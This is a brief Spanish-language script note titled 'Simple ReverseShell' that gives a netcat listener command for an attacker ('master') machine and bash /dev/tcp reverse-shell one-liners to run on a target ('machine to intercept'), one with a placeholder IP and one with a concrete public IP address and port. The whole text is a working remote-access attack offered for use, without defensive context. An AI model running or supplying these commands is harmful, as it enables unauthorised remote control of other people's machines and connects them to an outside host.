# Simple ReverseShell
# Script para habilitar una Shell remota desde un servidor o maquina con linux a otra.

# MAQUINA MASTER: Debe escuchar en puerto 445(verificar firewall si es vps) y debe tener acceso a internet.
# Levantar socket maquina MASTER.
sudo nc -lvnp 445

# MAQUINA A INTECEPTAR: el comando se puede ejecutar como root o user
bash -c 'bash -i >& /dev/tcp/{IP}/445 0>&1'
bash -c 'bash -i >& /dev/tcp/85.215.56.95/2525 0>&1'